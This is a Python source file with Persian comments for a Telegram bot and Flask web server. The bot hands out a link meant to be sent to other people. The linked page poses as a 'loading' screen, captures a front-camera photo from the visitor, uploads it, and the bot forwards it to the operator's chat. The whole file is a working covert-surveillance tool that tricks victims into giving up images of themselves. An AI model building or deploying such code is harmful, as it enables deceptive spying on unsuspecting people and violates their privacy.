# telegram_camera_capture_bot.py
# نسخه اصلاح شده: مدیریت صحیح حلقه رویداد و ارسال عکس‌ها

import os
import io
import uuid
import asyncio
import logging
import base64
from flask import Flask, request, render_template_string
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# ================== پیکربندی ==================
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
ADMIN_CHAT_ID = None

pending_photos = {}

# ================== بخش Flask ==================
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>لطفاً صبر کنید...</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding-top: 20vh; font-family: Arial; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>در حال بارگیری...</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
        const token = "{{ token }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                    fetch('/upload/' + token, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: dataURL })
                    }).then(res => res.json()).then(data => {
                        document.body.innerHTML = '<h2>با تشکر! می‌توانید این صفحه را ببندید.</h2>';
                    }).catch(err => {
                        document.body.innerHTML = '<h2>خطا در ارسال. لطفاً دوباره تلاش کنید.</h2>';
                    });
                    setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 1000);
                };
            } catch (err) {
                document.body.innerHTML = '<h2>عدم دسترسی به دوربین. لطفاً مجوز را صادر کنید و دوباره تلاش کنید.</h2>';
            }
        }
        capture();
    </script>
</body>
</html>
"""

@app.route('/capture/<token>')
def capture_page(token):
    return render_template_string(HTML_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload_photo(token):
    data = request.get_json()
    if not data or 'image' not in data:
        return {"status": "error", "message": "عکسی دریافت نشد."}, 400
    try:
        image_data = base64.b64decode(data['image'].split(',')[1])
        pending_photos[token] = image_data
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

# ================== بخش ربات تلگرام ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ADMIN_CHAT_ID
    ADMIN_CHAT_ID = update.effective_chat.id
    capture_token = str(uuid.uuid4())
    link = f"{PUBLIC_URL}/capture/{capture_token}"
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📸 گرفتن عکس", url=link)]])
    await update.message.reply_text(
        "روی دکمه زیر کلیک کنید یا لینک را برای دیگران بفرستید.",
        reply_markup=keyboard
    )

async def poll_photos(bot):
    """بررسی عکس‌های جدید و ارسال به ادمین (نیازمند self.bot)"""
    if not ADMIN_CHAT_ID:
        return
    to_remove = []
    for token, photo_data in list(pending_photos.items()):
        try:
            await bot.send_photo(
                chat_id=ADMIN_CHAT_ID,
                photo=io.BytesIO(photo_data),
                caption=f"📷 عکس جدید از لینک {token}"
            )
            to_remove.append(token)
        except Exception as e:
            logger.error(f"ارسال عکس با خطا مواجه شد: {e}")
    for t in to_remove:
        del pending_photos[t]

async def background_poll(application, stop_event):
    """حلقه‌ی پس‌زمینه برای بررسی عکس‌ها تا زمانی که رویداد توقف دریافت نشود"""
    while not stop_event.is_set():
        await poll_photos(application.bot)
        await asyncio.sleep(5)

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

async def main():
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))

    # یک رویداد for stopping the background task
    stop_event = asyncio.Event()

    # ایجاد تسک پس‌زمینه
    bg_task = asyncio.create_task(background_poll(application, stop_event))

    logger.info("ربات و وب سرور فعال شدند...")

    try:
        # اجرای polling (تا زمانی که یک سیگنال متوقف شود)
        await application.run_polling()
    finally:
        # توقف تسک پس‌زمینه
        stop_event.set()
        bg_task.cancel()
        try:
            await bg_task
        except asyncio.CancelledError:
            logger.info("تسک پس‌زمینه متوقف شد.")
        # خاتمه دادن به application
        await application.stop()
        await application.shutdown()

if __name__ == "__main__":
    # اجرای main در یک حلقه‌ی رویداد جداگانه
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
    finally:
        loop.close()
